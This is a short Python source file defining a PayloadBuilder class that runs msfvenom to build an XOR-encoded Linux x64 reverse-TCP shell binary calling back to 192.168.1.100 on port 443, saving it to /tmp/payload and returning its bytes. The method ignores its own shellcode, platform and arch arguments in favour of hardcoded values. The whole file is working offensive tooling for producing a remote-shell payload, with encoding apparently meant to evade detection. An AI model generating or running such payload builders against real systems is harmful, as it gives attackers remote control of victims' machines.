import subprocess

class PayloadBuilder:
    def build_payload(self, shellcode, platform="linux", arch="x86_64"):
        cmd = ["msfvenom", "-p", "linux/x64/shell_reverse_tcp",
               "LHOST=192.168.1.100", "LPORT=443",
               "-e", "x64/xor_dynamic", "-f", "elf", "-o", "/tmp/payload"]
        subprocess.run(cmd, check=True)
        with open("/tmp/payload", "rb") as f:
            return f.read()